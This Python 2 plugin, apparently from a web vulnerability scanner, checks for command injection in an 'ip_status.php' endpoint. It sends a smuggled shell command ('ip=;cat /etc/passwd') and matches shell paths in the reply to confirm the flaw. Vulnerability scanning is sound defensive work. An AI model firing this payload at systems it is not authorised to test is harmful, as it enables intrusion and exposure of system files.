#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url+="php/ip_status.php?ip=;cat%20/etc/passwd"

        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        m = re.search(r"/bin/(bash|sh)[^\r\n<>]*[\r\n]",content,re.I)
        if m:
            
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Eyoucmdexecutescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Eyoucmdexecutescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def